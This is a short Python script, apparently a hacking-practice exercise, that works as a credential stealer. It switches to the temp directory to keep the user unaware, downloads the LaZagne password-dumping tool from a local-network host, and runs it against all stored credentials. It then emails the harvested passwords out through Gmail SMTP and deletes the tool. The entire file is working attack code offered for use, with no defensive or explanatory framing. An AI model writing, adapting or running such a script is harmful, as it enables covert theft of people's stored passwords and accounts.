#! /usr/bin/env python
import requests
import subprocess,smtplib,os,tempfile

def downlaod(url):
    get_response= requests.get(url)
    file_name=url.split("/")
    with open(file_name[-1],"wb") as out_file: #r is read
        out_file.write(get_response.content)

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587) #create a smtp sevrer
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)#from ,to, message
    server.quit()

temp_directory=tempfile.gettempdir()
os.chdir(temp_directory) #move to temp dir so that user is unaware
downlaod("http://192.168.1.106:8000/lazagne.exe")
result= subprocess.check_output("lazagne.exe all", shell=True)
send_mail("email@gmail.com","password",result)

os.remove("lazagne.exe")

